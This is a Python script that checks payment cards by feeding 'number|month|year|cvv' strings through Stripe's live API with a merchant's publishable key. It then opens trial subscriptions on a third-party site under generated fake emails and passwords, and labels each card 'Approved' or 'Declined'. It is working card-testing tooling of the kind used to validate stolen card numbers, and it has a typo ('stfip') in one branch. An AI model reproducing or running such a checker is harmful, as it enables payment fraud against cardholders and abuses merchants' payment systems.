import random, requests, re, string
from faker import Faker

fake = Faker()
def passf():
    caracteres = string.ascii_letters + string.digits
    contrasena = ''.join(random.choice(caracteres) for _ in range(12))
    return contrasena
def mails():
    dominios = ['hotmail.com', 'gmail.com', 'outlook.com', 'yahoo.com']
    nombre_usuario = fake.user_name().replace(" ", "").replace(".", "").replace("-", "").lower()
    dominio = random.choice(dominios)
    correo = f"{nombre_usuario}@{dominio}"
    return correo
    
def main2(si):
    sessio = requests.Session()
    carad = si
    carda = carad.replace(":", "/")
    cads = carda.replace("/", "|")
    card = cads.strip().split("|")
    num, mes, ano, cvv = card
    url0 = "https://m.stripe.com/6"
    cookies0 = {
  "m": "b9bcc1a9-5568-4fb3-b23f-b5d67f95b4a559759d",
    }
    
    headers0 = {
  "Host": "m.stripe.com",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "Content-Type": "text/plain;charset=UTF-8",
  "sec-ch-ua-mobile": "?1",
  "Accept": "*/*",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.7",
  "Origin": "https://m.stripe.network",
  "Sec-Fetch-Site": "cross-site",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Storage-Access": "none",
  "Referer": "https://m.stripe.network/",
  "Accept-Encoding": "gzip, deflate, br, zstd"
    }
    data0 = """user_ud==i8723"""
    res0 = sessio.post(url0, headers=headers0, cookies=cookies0, data=data0)
    mid = res0.json()["muid"]
    suid = res0.json()["sid"]
    gid = res0.json()["guid"]
    
    
    url1 = "https://api.stripe.com/v1/payment_methods"
    headers1 = {
  "Host": "api.stripe.com",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "Content-Type": "application/x-www-form-urlencoded",
  "sec-ch-ua-mobile": "?1",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.9",
  "Origin": "https://js.stripe.com",
  "Sec-Fetch-Site": "same-site",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Referer": "https://js.stripe.com/",
  "Accept-Encoding": "gzip, deflate, br, zstd"
    }
    data1 = f"""type=card&card[number]={num}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={gid}&muid={mid}&sid={suid}&pasted_fields=number&payment_user_agent=stripe.js%2Fd13c85e5a9%3B+stripe-js-v3%2Fd13c85e5a9%3B+card-element&referrer=https%3A%2F%2Fwww.immersivecheck.com&time_on_page=30312&key=pk_live_51QlKxuG18PWvcFjDPmTbZQzkWgrC4y91RBwoucMdAD0iNy2CyQfrAXbZhVXNexQgthNSwRPLuGnwv1pcu24dXuRE001ebwZ5U7"""
    res1 = sessio.post(url1, headers=headers1, data=data1)
    pm = res1.json()["id"]
    
    url2= "https://atmos.soundcode.app/api/api/create-subscription"
    headers2 = {
  "Host": "atmos.soundcode.app",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json, text/plain, */*",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "Content-Type": "application/json",
  "sec-ch-ua-mobile": "?1",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.9",
  "Origin": "https://www.immersivecheck.com",
  "Sec-Fetch-Site": "cross-site",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Referer": "https://www.immersivecheck.com/",
  "Accept-Encoding": "gzip, deflate, br, zstd"
    }
    data2 = f"""{{"paymentMethodId":"{pm}","priceId":"price_1Qo5uEG18PWvcFjDi8SMniQa","email":"{mails().strip()}","password":"{passf()}","trialPeriodDays":7}}"""

    res2 = sessio.post(url2, headers=headers2, data=data2)
    if "Your card was declined." in res2.text:
        return [si.strip(), "Declined", "Your card was declined."]
    elif '"confirmed":true' in res2.text:
        return [si.strip(), "Approved", "Subscription started"]
    elif "Your card's security code is incorrect" in res2.text:
        return [si.strip(), "Approved", "Your card's security code is incorrect"]
    elif "error" in res2.text:
    	return [si.stfip(), "Declined", res2.json()["error"]["message"]]
    else:
        print(f"[blue]{si} ->  fallida.")
    sessio.close()
  